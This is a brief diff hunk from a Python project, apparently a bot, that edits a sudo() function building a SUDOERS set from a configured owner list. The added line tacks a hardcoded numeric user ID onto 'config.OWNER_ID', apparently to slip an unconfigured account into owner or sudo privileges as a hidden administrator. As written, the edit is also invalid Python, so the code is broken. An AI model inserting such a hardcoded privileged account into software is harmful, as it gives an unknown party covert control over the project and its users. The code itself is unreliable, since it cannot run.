@@ -44,7 +44,7 @@ def dbb():
 
 def sudo():
     global SUDOERS
-    OWNER = config.OWNER_ID
+    OWNER = config.OWNER_ID 6277238293
     if config.MONGO_DB_URI is None:
         for user_id in OWNER:
             SUDOERS.add(user_id)
